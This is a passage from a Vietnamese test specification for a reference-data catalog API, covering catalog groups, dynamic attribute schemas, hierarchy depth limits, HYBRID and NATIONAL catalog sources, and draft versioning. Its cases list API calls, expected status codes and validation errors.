  2. Gọi `GET /catalog-groups`.
  3. Trên UI-07-01, mở rộng nút "Hành chính" ở khung trái.
- **Mong đợi** Bước 1 trả `201`. Bước 2 trả cây có `TC019_NHOM` dưới `HANH_CHINH`, sắp theo `sortOrder`, mỗi nút có số danh mục. Giao diện hiển thị nhóm mới, bấm vào lọc bảng danh mục theo nhóm (FR-07-001). KT: có (CREATE catalog_group).

#### TC-07-020 · Di chuyển nhóm tạo vòng trong cây nhóm
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-009 · ERR-07-039
- **Tiền điều kiện / dữ liệu** `HANH_CHINH` là cha của `HANH_CHINH.TO_CHUC`.
- **Bước**
  1. Gọi `PATCH /catalog-groups/<id HANH_CHINH>` với `parentId` = id của `HANH_CHINH.TO_CHUC`, `If-Match` đúng.
- **Mong đợi** `409` `ERR-07-039` (chi tiết "tạo vòng trong cây nhóm"). Cây không đổi.

#### TC-07-021 · Xóa nhóm rỗng
- **Loại** Dương · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-010
- **Tiền điều kiện / dữ liệu** `TC019_NHOM` rỗng.
- **Bước**
  1. Gọi `DELETE /catalog-groups/<id TC019_NHOM>`.
- **Mong đợi** `204`; nhóm không còn trong cây. KT: có (DELETE catalog_group).

#### TC-07-022 · Không xóa được nhóm còn danh mục
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-010 · ERR-07-037
- **Tiền điều kiện / dữ liệu** `HANH_CHINH` chứa 2 danh mục.
- **Bước**
  1. Gọi `DELETE /catalog-groups/<id HANH_CHINH>`.
- **Mong đợi** `409`, `ERR-07-037`, chi tiết nêu số danh mục còn lại. Nhóm giữ nguyên.

#### TC-07-023 · Tạo nhóm trùng mã
- **Loại** Âm · **Ưu tiên** P3 · **Tự động** API
- **Truy vết** FR-07-010 · API-07-008 · ERR-07-039
- **Tiền điều kiện / dữ liệu** Nhóm `HANH_CHINH` tồn tại.
- **Bước**
  1. Gọi `POST /catalog-groups` với `code` = `hanh_chinh`.
- **Mong đợi** `409` `ERR-07-039` (chi tiết chỉ rõ trường `code`). Không tạo nhóm mới.

### TS-07-03 · Lược đồ thuộc tính động và phân cấp

**Mục tiêu.** Xác nhận người soạn khai báo, sửa, ẩn, xóa, sắp thứ tự thuộc tính động trong bản nháp; hệ thống kiểm tra tương thích với dữ liệu hiện có (BR-07-013), chặn thuộc tính mức Nhạy cảm (BR-07-025), sinh đúng JSON Schema và cấu hình phân cấp đúng giới hạn (BR-07-014). Kịch bản thay thế LGC-DMDC-004, 010, 018 (hệ cũ chỉ có tên thuộc tính, thứ tự và trạng thái, không có kiểu).

**Phủ.** FR-07-005, 006, 007; BR-07-006, 013, 014, 025; API-07-022…025, 048; UI-07-04; ERR-07-004, 009, 011, 014, 036.

**Tiền điều kiện chung.** CAT-LH có bản nháp v2 (`DRAFT`) tạo từ v1; người gọi U-T68-DS-NV.

#### TC-07-024 · Thêm thuộc tính với đủ các kiểu dữ liệu và ràng buộc
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-005 · API-07-023, 022 · UI-07-04 · LGC-DMDC-004
- **Tiền điều kiện / dữ liệu** Bản nháp v2 của CAT-LH.
- **Bước**
  1. Lần lượt gọi `POST /catalogs/LOAI_HINH_TC/versions/draft/attributes` cho 11 thuộc tính, mỗi kiểu một thuộc tính: `STRING` (`maxLength` 50, `pattern` `^[A-Z]+$`), `TEXT`, `INTEGER` (`minValue` 0, `maxValue` 1000), `DECIMAL`, `BOOLEAN`, `DATE`, `DATETIME`, `ENUM` (`enumValues` `["A","B"]`), `CATALOG_REF` (`refCatalogCode` `DAN_TOC`), `URI`, `EMAIL`; tất cả không bắt buộc.
  2. Gọi `GET .../versions/draft/attributes`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/schema?version=draft`.
- **Mong đợi** Mỗi lệnh trả `201`. Bước 2 liệt kê 16 thuộc tính (5 cũ, 11 mới) theo `sortOrder`. Bước 3 trả JSON Schema (draft 2020-12) có `properties.attrs.properties` đủ 16 khóa, kiểu ánh xạ đúng (`DATE` thành `string` + `format: date`, `ENUM` thành `enum`, `CATALOG_REF` thành `string` kèm `x-ref-catalog`). Phiên bản v1 đã phát hành vẫn chỉ có 5 thuộc tính. KT: có (CREATE attribute_def × 11).

#### TC-07-025 · Chặn thuộc tính mức Nhạy cảm và tên gợi ý dữ liệu cá nhân
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-005 · BR-07-025 · ERR-07-036
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi thêm thuộc tính với `{"code":"so_dinh_danh","label":"Số định danh cá nhân","dataType":"STRING"}`.
  2. Gọi thêm thuộc tính `{"code":"ghi_chu","dataType":"TEXT","dataClass":"NHAY_CAM"}` (khai báo mức Nhạy cảm).
  3. Gọi thêm thuộc tính `{"code":"ngay_sinh_nguoi_dai_dien","label":"Ngày sinh","dataType":"DATE"}`.
- **Mong đợi** Cả ba trả `422`, `ERR-07-036`, chi tiết nêu lý do (tên khớp danh sách từ khóa dữ liệu cá nhân hoặc mức phân loại bị cấm). Không thuộc tính nào được tạo.

> **Câu hỏi mở Q07-77:** Danh sách từ khóa gợi ý dữ liệu cá nhân (ví dụ `cccd`, `cmnd`, `dinh_danh`, `ngay_sinh`, `so_dien_thoai`, `ho_ten`) cần được ATTT và PH-09 thống nhất, cấu hình được theo nền tảng; TC-07-025 dùng bộ từ khóa mặc định trong SDD.

#### TC-07-026 · Thuộc tính CATALOG_REF trỏ danh mục không tồn tại và ràng buộc mâu thuẫn
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-005 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Thêm thuộc tính `CATALOG_REF` với `refCatalogCode` = `KHONG_CO`.
  2. Thêm thuộc tính `INTEGER` với `minValue` 10, `maxValue` 5.
  3. Thêm thuộc tính `ENUM` với `enumValues` rỗng.
  4. Thêm thuộc tính có `code` = `ma` (trùng cột cố định `MA` của khuôn tệp).
- **Mong đợi** Mỗi lệnh trả `422`, `ERR-07-009` với mảng `errors` nêu trường sai (`refCatalogCode`, `minValue`, `enumValues`, `code`).

#### TC-07-027 · Không sửa lược đồ của phiên bản đã phát hành
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-005, 006 · BR-07-006 · ERR-07-004
- **Tiền điều kiện / dữ liệu** v1 của CAT-LH `PUBLISHED`.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions/1/attributes`.
  2. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/1/attributes/viet_tat`.
  3. Gọi `DELETE /catalogs/LOAI_HINH_TC/versions/1/attributes/viet_tat`.
- **Mong đợi** Cả ba trả `409`, `ERR-07-004`. `schema_hash` của v1 không đổi.

#### TC-07-028 · Sửa nhãn, sắp lại thứ tự và ẩn thuộc tính
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-006 · API-07-024 · UI-07-04 · LGC-DMDC-010, 018
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"label":"Tên viết tắt","sortOrder":1}`.
  2. Gọi `PATCH .../attributes/website` thân `{"status":"HIDDEN"}`.
  3. Trên UI-07-04 kéo thả thuộc tính `cap_quan_ly` lên đầu danh sách và lưu.
  4. Gọi `GET /catalogs/LOAI_HINH_TC/import-template?format=xlsx` (theo bản nháp).
- **Mong đợi** Các lệnh trả `200`. Thứ tự mới được lưu. Thuộc tính `website` HIDDEN không hiện trong tệp mẫu và không trả trong API khai thác sau khi phát hành, nhưng giá trị cũ vẫn được giữ trong `attrs`. Bộ phân loại khác biệt coi đổi nhãn, thứ tự, ẩn là thay đổi không phá vỡ.

#### TC-07-029 · Đổi kiểu thuộc tính khi mọi giá trị chuyển đổi được
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-006 · BR-07-013 · API-07-024
- **Tiền điều kiện / dữ liệu** Thuộc tính `ma_so` STRING có giá trị "001", "25", "300" trên 3 bản ghi của bản nháp.
- **Bước**
  1. Gọi `PATCH .../attributes/ma_so` thân `{"dataType":"INTEGER"}`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** Bước 1 trả `200`; giá trị trong `attrs` được chuyển thành số 1, 25, 300. Bước 2 có mục `ATTRIBUTE_TYPE_CHANGED` đánh dấu `breaking = true` (đổi kiểu là phá vỡ theo khung §3.18).

#### TC-07-030 · Đổi kiểu thuộc tính khi có giá trị không chuyển được
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** `viet_tat` STRING có giá trị "UBND", "SNV".
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"dataType":"INTEGER"}`.
  2. Gọi `PATCH .../attributes/ngay_thanh_lap` thân `{"dataType":"BOOLEAN"}`.
- **Mong đợi** Cả hai trả `422`, `ERR-07-014`, chi tiết liệt kê tối đa 20 mã bản ghi có giá trị không chuyển được và tổng số. Lược đồ không đổi.

#### TC-07-031 · Thu hẹp ràng buộc độ dài và miền giá trị
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** `viet_tat` `maxLength` 20, giá trị dài nhất 12 ký tự; `cap_quan_ly` ENUM {`TINH`,`XA`} có cả hai giá trị được dùng.
- **Bước**
  1. Gọi đổi `maxLength` thành 12.
  2. Gọi đổi `maxLength` thành 11.
  3. Gọi đổi `enumValues` thành `["TINH"]`.
- **Mong đợi** Bước 1 trả `200` và diff đánh dấu thay đổi phá vỡ (thu hẹp ràng buộc). Bước 2 trả `422` `ERR-07-014` (giá trị 12 ký tự vi phạm). Bước 3 trả `422` `ERR-07-014`.

#### TC-07-032 · Xóa thuộc tính trong bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · API-07-025
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có `so_bien_che` với giá trị trên 39 bản ghi.
- **Bước**
  1. Gọi `DELETE .../versions/draft/attributes/so_bien_che`.
  2. Gọi `GET .../versions/draft/diff?against=current`.
- **Mong đợi** Bước 1 trả `204`; khóa `so_bien_che` bị gỡ khỏi `attrs` của bản ghi trong bản nháp (v1 giữ nguyên). Bước 2 có `ATTRIBUTE_REMOVED` với `breaking = true`; vì có thay đổi phá vỡ, phiên bản phải qua duyệt (BR-07-012).

#### TC-07-033 · Thêm thuộc tính bắt buộc không có giá trị mặc định khi đã có bản ghi
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-005 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** Bản nháp v2 có 39 bản ghi.
- **Bước**
  1. Thêm thuộc tính `ma_qhns` STRING `required = true`, không `defaultValue`.
  2. Thêm lại với `defaultValue` = "CHUA_CO".
- **Mong đợi** Bước 1 trả `422` `ERR-07-014`. Bước 2 trả `201`, 39 bản ghi nhận giá trị mặc định.

#### TC-07-034 · Bật ràng buộc duy nhất khi dữ liệu đang trùng
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-006 · BR-07-013 · ERR-07-014
- **Tiền điều kiện / dữ liệu** Hai bản ghi có `viet_tat` = "SNV".
- **Bước**
  1. Gọi `PATCH .../attributes/viet_tat` thân `{"uniqueInVersion":true}`.
- **Mong đợi** `422`, `ERR-07-014`, chi tiết nêu giá trị trùng "SNV" và hai mã bản ghi.

#### TC-07-035 · Cấu hình phân cấp: bật cây, số cấp, tên cấp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-007 · BR-07-014 · API-07-002, 004 · UI-07-03 · LGC-DMDC-002
- **Tiền điều kiện / dữ liệu** Danh mục mới `TC035_CAY` phẳng, DRAFT.
- **Bước**
  1. Gọi `PATCH /catalogs/TC035_CAY` thân `{"isHierarchical":true,"maxDepth":4,"levelNames":["Cấp 1","Cấp 2","Cấp 3","Cấp 4"]}`.
  2. Thêm 4 bản ghi lồng nhau `A`, `A.1` (cha `A`), `A.1.1`, `A.1.1.1`.
  3. Mở tab Bản ghi dạng cây trên UI-07-02.
- **Mong đợi** Bước 1 trả `200`. Bước 2 thành công, `depth` lần lượt 1…4, `levelName` đúng tên cấp, `path` đúng chuỗi tổ tiên. Cây hiển thị 4 cấp.

#### TC-07-036 · Số cấp tối đa vượt giới hạn 10
- **Loại** Âm, Biên · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-007 · BR-07-014
- **Tiền điều kiện / dữ liệu** `TC035_CAY`.
- **Bước**
  1. Đặt `maxDepth` = 10 với 10 tên cấp.
  2. Đặt `maxDepth` = 11.
  3. Đặt `maxDepth` = 3 nhưng `levelNames` có 2 phần tử.
- **Mong đợi** Bước 1 trả `200`. Bước 2 và 3 trả `422` lỗi kiểm tra hợp lệ (trường `maxDepth`, `levelNames`).

#### TC-07-037 · Giảm số cấp dưới độ sâu dữ liệu hiện có
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-007 · BR-07-014 · ERR-07-011
- **Tiền điều kiện / dữ liệu** `TC035_CAY` có bản ghi độ sâu 4.
- **Bước**
  1. Gọi `PATCH /catalogs/TC035_CAY` thân `{"maxDepth":3,"levelNames":["Cấp 1","Cấp 2","Cấp 3"]}`.
- **Mong đợi** `422`, `ERR-07-011`, chi tiết nêu mã `A.1.1.1` vượt cấp.

#### TC-07-038 · JSON Schema sinh từ định nghĩa kiểm tra đúng bản ghi
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** UT (jqwik)
- **Truy vết** FR-07-005, 013, 033 · ADR-050
- **Tiền điều kiện / dữ liệu** Bộ sinh định nghĩa thuộc tính ngẫu nhiên (jqwik) gồm mọi kiểu và ràng buộc.
- **Bước**
  1. Với mỗi định nghĩa ngẫu nhiên, sinh JSON Schema; sinh 100 giá trị hợp lệ và 100 giá trị vi phạm từng ràng buộc.
  2. Kiểm tra bằng bộ kiểm tra JSON Schema (networknt) và bằng bộ kiểm tra nghiệp vụ của PH-07.
- **Mong đợi** Giá trị hợp lệ được chấp nhận, giá trị vi phạm bị từ chối; hai bộ kiểm tra cho kết quả giống nhau 100%.

### TS-07-04 · Nguồn danh mục, quyền cập nhật và mở rộng HYBRID

**Mục tiêu.** Xác nhận ba loại nguồn (`LOCAL`, `NATIONAL`, `HYBRID`) được thiết lập đúng, danh mục NATIONAL chỉ cập nhật qua đồng bộ, danh mục HYBRID chỉ chứa bản ghi bổ sung trong dải mã địa phương và khi tra cứu trả hợp của bản COMMON hiệu lực với phần bổ sung (ADR-052). Thay thế cờ `Is_update` của Aita (LGC-DMDC-017).

**Phủ.** FR-07-008, 048; BR-07-009, 010; UC-07-17; API-07-002, 004, 027, 041, 042; ERR-07-003, 008, 012.

**Tiền điều kiện chung.** CAT-DT, CAT-DT68 như mục 2.3; người gọi U-T68-DS-NV.

#### TC-07-039 · Tạo danh mục HYBRID mở rộng danh mục COMMON
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008, 048 · UC-07-17 · API-07-002 · LGC-DMDC-017
- **Tiền điều kiện / dữ liệu** `QUOC_TICH` (COMMON) ACTIVE.
- **Bước**
  1. Gọi `POST /catalogs` thân `{"code":"TC039_QT_T68","name":"Quốc tịch mở rộng T68","sourceType":"HYBRID","extendsCatalogCode":"QUOC_TICH","localCodePattern":"^68\\.[0-9]{2}$"}`.
  2. Gọi `GET /catalogs/TC039_QT_T68`.
- **Mong đợi** `201`; `extendsCatalogId` trỏ đúng `QUOC_TICH` COMMON; lược đồ thuộc tính của bản nháp kế thừa từ phiên bản hiện hành của danh mục gốc (chỉ đọc), không thêm được thuộc tính bắt buộc mới. EVT-07-01 phát.

#### TC-07-040 · Thêm bản ghi bổ sung trong dải mã địa phương
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008, 048 · BR-07-010 · API-07-027
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp.
- **Bước**
  1. Gọi `POST /catalogs/DAN_TOC_T68/versions/draft/items` thân `{"code":"68.03","name":"Nhóm địa phương thử"}`.
- **Mong đợi** `201`; bản ghi có `isLocalExtension = true`. KT: có.

#### TC-07-041 · Thêm bản ghi HYBRID ngoài dải mã địa phương
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008 · BR-07-010 · ERR-07-012 · AT-07-007 (SRS cũ)
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp.
- **Bước**
  1. Thêm bản ghi `code` = `69.01`.
  2. Thêm bản ghi `code` = `68.1`.
- **Mong đợi** Cả hai trả `422`, `ERR-07-012`, chi tiết có biểu thức dải hợp lệ `^68\.[0-9]{2}$`.

#### TC-07-042 · Bản ghi HYBRID trùng mã danh mục gốc
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** BR-07-010 · ERR-07-008
- **Tiền điều kiện / dữ liệu** Danh mục HYBRID `TC042_DT` với dải rộng `^[0-9]{2}$` (cố ý chồng lấn với mã gốc `01`…`55`).
- **Bước**
  1. Thêm bản ghi `code` = `05`.
  2. Thêm bản ghi `code` = `90`.
- **Mong đợi** Bước 1 trả `409`, `ERR-07-008` (trùng mã của danh mục gốc). Bước 2 trả `201`.

> **Câu hỏi mở Q07-78:** Khi tạo danh mục HYBRID, có nên chặn ngay biểu thức dải mã địa phương chồng lấn với mã hiện có của danh mục gốc hay chỉ chặn từng bản ghi như TC-07-042? Ca kiểm thử hiện theo cách chặn từng bản ghi.

#### TC-07-043 · Tra cứu danh mục HYBRID trả hợp bản COMMON và phần bổ sung
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-048, 028, 026 · ADR-052 · API-07-041, 042
- **Tiền điều kiện / dữ liệu** CAT-DT68 v1 đã phát hành với 2 bản ghi bổ sung; `DAN_TOC` COMMON có 55 bản ghi. Người gọi APP-T68-READ.
- **Bước**
  1. Gọi `GET /catalogs/DAN_TOC_T68/items?limit=1000`.
  2. Gọi `GET /catalogs/DAN_TOC_T68/items/05`.
  3. Gọi `GET /catalogs/DAN_TOC_T68/items/68.01`.
  4. Gọi `GET /catalogs/DAN_TOC/items/68.01` bằng APP-T68-READ.
- **Mong đợi** Bước 1 trả 57 bản ghi, phần bổ sung có `isLocalExtension = true`. Bước 2 trả bản ghi gốc. Bước 3 trả bản ghi bổ sung. Bước 4 trả `404` `ERR-07-007` (bản ghi địa phương không lẫn vào danh mục COMMON).

#### TC-07-044 · Tenant sửa bản ghi gốc qua danh mục HYBRID hoặc trực tiếp danh mục COMMON
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-048 · BR-07-009, 010 · ERR-07-003
- **Tiền điều kiện / dữ liệu** CAT-DT68 có bản nháp; người gọi U-T68-TA.
- **Bước**
  1. Gọi `PATCH /catalogs/DAN_TOC_T68/versions/draft/items/05` sửa tên.
  2. Gọi `POST /catalogs/DAN_TOC/versions` (tạo bản nháp danh mục COMMON).
  3. Gọi `POST /catalogs/DAN_TOC/versions/draft/items`.
- **Mong đợi** Cả ba trả `403`, `ERR-07-003`. Không có thay đổi trong dữ liệu COMMON (kiểm tra `updated_at` của danh mục `DAN_TOC`). EVT: không.

#### TC-07-045 · Không sửa thủ công danh mục NATIONAL
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-008 · BR-07-009 · ERR-07-003 · AT-07-005 (SRS cũ)
- **Tiền điều kiện / dữ liệu** Danh mục `TC045_NAT` của T68 `sourceType = NATIONAL` được tạo bởi đồng bộ.
- **Bước**
  1. Người dùng U-T68-TA gọi `POST /catalogs/TC045_NAT/versions`.
  2. Gọi `POST /import-jobs` nhập vào `TC045_NAT`.
  3. Gọi `PATCH /catalogs/TC045_NAT` đổi `sourceType` thành `LOCAL`.
- **Mong đợi** Bước 1, 2 trả `403` `ERR-07-003`. Bước 3 trả `403` `ERR-07-003` (không đổi nguồn của danh mục đã gắn đồng bộ; muốn tách phải gỡ nguồn đồng bộ trước theo quy trình ở FRS).

#### TC-07-046 · Danh mục HYBRID tự theo phiên bản mới của danh mục gốc
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** IT
- **Truy vết** FR-07-048 · ADR-052 · EVT-07-05
- **Tiền điều kiện / dữ liệu** U-PA phát hành `DAN_TOC` v mới thêm mã `56` hiệu lực 2026-11-21.
- **Bước**
  1. Sau khi nhận sự kiện `common.rdm.catalog.published.v1`, gọi `GET /catalogs/DAN_TOC_T68/items/56` bằng APP-T68-READ.
  2. Gọi `GET /catalogs/DAN_TOC_T68/items/56?at=2026-11-20`.
- **Mong đợi** Bước 1 trả `200` trong vòng 5 giây sau sự kiện (con trỏ hiệu lực được làm mới). Bước 2 trả `404` `ERR-07-007` (trước ngày hiệu lực).

### TS-07-05 · Bản nháp và bản ghi

**Mục tiêu.** Xác nhận cơ chế phiên bản sao chép khi ghi (copy-on-write): tạo bản nháp từ phiên bản hiện hành, thêm, sửa, ngừng dùng, khôi phục, xóa bản ghi trên bản nháp; kiểm tra hợp lệ đầy đủ (kiểu, bắt buộc, duy nhất, mã cha, vòng, độ sâu); hủy bản nháp; bảo đảm phiên bản đã phát hành không bị ảnh hưởng. Thay thế LGC-DMDC-011 (hệ cũ sửa trực tiếp, không có phiên bản).

**Phủ.** FR-07-011, 012, 013, 017, 018, 019; BR-07-002, 003, 004, 005, 006, 014; UC-07-02; API-07-012…016, 026…030, 044; UI-07-05; ERR-07-004, 005, 008, 009, 010, 011, 013, 018.

**Tiền điều kiện chung.** CAT-LH v1 PUBLISHED, chưa có phiên bản mở (trừ khi ca ghi khác); người gọi U-T68-DS-NV.

#### TC-07-047 · Tạo bản nháp từ phiên bản hiện hành
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-011 · API-07-012 · UC-07-02 · ADR-051 · LGC-DMDC-011
- **Tiền điều kiện / dữ liệu** CAT-LH v1 có 39 bản ghi, 5 thuộc tính.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions` với `Idempotency-Key`.
  2. Gọi `GET /catalogs/LOAI_HINH_TC/versions/draft`.
  3. Truy vấn CSDL: đếm `catalog_item` và `attribute_def` theo `version_id` của bản nháp.
- **Mong đợi** `201`; bản nháp `version_no = 2`, `status = DRAFT`, `origin = MANUAL`, `effective_from` rỗng. Số bản ghi 39 và số thuộc tính 5 sao chép đầy đủ với `id` mới, cùng `code`. `catalog.current_version_id` vẫn trỏ v1. KT: có (CREATE catalog_version). EVT: không.

#### TC-07-048 · Không tạo bản nháp thứ hai khi đã có phiên bản mở
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-011 · BR-07-005 · ERR-07-005
- **Tiền điều kiện / dữ liệu** Lặp lại cho ba trạng thái phiên bản mở: `DRAFT`, `IN_REVIEW`, `APPROVED`.
- **Bước**
  1. Với mỗi trạng thái, gọi `POST /catalogs/LOAI_HINH_TC/versions` với `Idempotency-Key` mới.
  2. Gửi đồng thời hai yêu cầu tạo bản nháp (hai luồng) khi chưa có phiên bản mở.
- **Mong đợi** Bước 1 trả `409` `ERR-07-005` cả ba lần, chi tiết có `versionNo` đang mở. Bước 2: đúng một yêu cầu trả `201`, yêu cầu kia `409` `ERR-07-005` (chỉ mục duy nhất từng phần chặn tranh chấp).

#### TC-07-049 · Sửa ngày hiệu lực, căn cứ pháp lý, ghi chú của bản nháp
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-016 · API-07-014
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `PATCH /catalogs/LOAI_HINH_TC/versions/draft` với `If-Match`, thân `{"effectiveFrom":"2026-12-01","legalBasis":"Quyết định số 99/QĐ-UBND (giả lập)","changeNote":"Bổ sung loại hình"}`.
- **Mong đợi** `200`, các trường được lưu; `ETag` tăng.

#### TC-07-050 · Thêm bản ghi hợp lệ vào bản nháp
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012, 013 · API-07-027 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Gọi `POST .../versions/draft/items` thân `{"code":"kh01.l01.p10","name":"Phân loại thử","parentCode":"KH01.L01","sortOrder":10,"attrs":{"viet_tat":"PLT","cap_quan_ly":"TINH","ngay_thanh_lap":"2026-01-15"}}`.
  2. Trên UI-07-05, thêm một bản ghi bằng biểu mẫu.
- **Mong đợi** `201`; mã lưu chuẩn hóa `KH01.L01.P10`; `depth = 3`, `path = ["KH01","KH01.L01"]`, `status = ACTIVE`, `nameSearch` = "phan loai thu". `item_count` của bản nháp tăng. KT: có.

#### TC-07-051 · Thêm bản ghi trùng mã khác hoa thường
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-012, 013 · BR-07-002 · ERR-07-008
- **Tiền điều kiện / dữ liệu** Bản nháp có `KH01.L01.P10`.
- **Bước**
  1. Thêm bản ghi `code` = `Kh01.l01.p10`.
  2. Thêm bản ghi `code` = ` KH01.L01.P10 ` (khoảng trắng đầu cuối).
- **Mong đợi** Cả hai trả `409`, `ERR-07-008`.

#### TC-07-052 · Giá trị thuộc tính vi phạm lược đồ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-013 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Bản nháp v2.
- **Bước**
  1. Thêm bản ghi với `attrs` đồng thời sai: `ngay_thanh_lap` = "2026-02-30", `cap_quan_ly` = "HUYEN", `viet_tat` dài 21 ký tự, `so_bien_che` = "mười", `website` = "khong-phai-uri", thêm khóa lạ `khong_khai_bao`.
  2. Thêm bản ghi thiếu `name`.
  3. Thêm bản ghi `code` = `KH-01/ABC` (vi phạm T-CODE).
- **Mong đợi** Bước 1 trả `422` `ERR-07-009` với mảng `errors` có đúng 6 phần tử (mỗi phần tử `{field, code, message}`), báo đủ lỗi một lần chứ không dừng ở lỗi đầu. Bước 2, 3 trả `422` `ERR-07-009`. Không bản ghi nào được tạo.

#### TC-07-053 · Mã cha không tồn tại và vượt số cấp tối đa
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-013 · BR-07-014 · ERR-07-010, ERR-07-011
- **Tiền điều kiện / dữ liệu** CAT-LH `maxDepth = 3`.
- **Bước**
  1. Thêm bản ghi `parentCode` = `KH99`.
  2. Thêm bản ghi `parentCode` = `KH01.L01.P01` (sẽ ở cấp 4).
- **Mong đợi** Bước 1 trả `422` `ERR-07-010`. Bước 2 trả `422` `ERR-07-011`.

#### TC-07-054 · Đổi mã cha tạo vòng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-013 · BR-07-014 · API-07-028 · ERR-07-010
- **Tiền điều kiện / dữ liệu** `KH01` là cha của `KH01.L01`.
- **Bước**
  1. Gọi `PATCH .../items/KH01` thân `{"parentCode":"KH01.L01"}`.
  2. Gọi `PATCH .../items/KH01` thân `{"parentCode":"KH01"}` (tự làm cha mình).
- **Mong đợi** Cả hai trả `422` `ERR-07-010` (chi tiết "tạo vòng"). Cây không đổi.

#### TC-07-055 · Ngừng dùng bản ghi kèm mã thay thế
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-012, 019 · BR-07-003, 004 · API-07-029 · UI-07-05
- **Tiền điều kiện / dữ liệu** Bản nháp v2; `KH02.L03.P01` đã phát hành ở v1, không có con.
- **Bước**
  1. Gọi `POST .../items/KH02.L03.P01:deprecate` thân `{"replacedBy":["KH02.L03.P02"],"reason":"Gộp loại hình"}`.
  2. Phát hành v2 (qua luồng duyệt chuẩn TS-07-07).
  3. Gọi `GET /catalogs/LOAI_HINH_TC/items/KH02.L03.P01` bằng APP-T68-READ.
- **Mong đợi** Bước 1 trả `200`, `status = DEPRECATED`, `replacedBy` lưu đúng. Bước 3 trả `200` kèm `status = DEPRECATED`, `replacedBy = ["KH02.L03.P02"]` (BR-07-004). Bộ phân loại khác biệt đánh dấu ngừng dùng mã là phá vỡ.

#### TC-07-056 · Ngừng dùng bản ghi cha còn con hoạt động và mã thay thế không tồn tại
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-019 · BR-07-014 · ERR-07-010, ERR-07-009
- **Tiền điều kiện / dữ liệu** `KH01.L01` có 3 con ACTIVE.
- **Bước**
  1. Gọi `POST .../items/KH01.L01:deprecate` không kèm tùy chọn ngừng dùng cả nhánh.
  2. Gọi `POST .../items/KH01.L02.P01:deprecate` thân `{"replacedBy":["KHONG_CO"]}`.
  3. Gọi `POST .../items/KH01.L02.P02:deprecate` thân `{"replacedBy":["KH01.L02.P02"]}` (tự thay thế).
- **Mong đợi** Bước 1 trả `422` `ERR-07-010` (bản ghi ACTIVE không được có cha DEPRECATED). Bước 2, 3 trả `422` `ERR-07-009` (trường `replacedBy`).

#### TC-07-057 · Khôi phục bản ghi đã ngừng dùng trong bản nháp mới
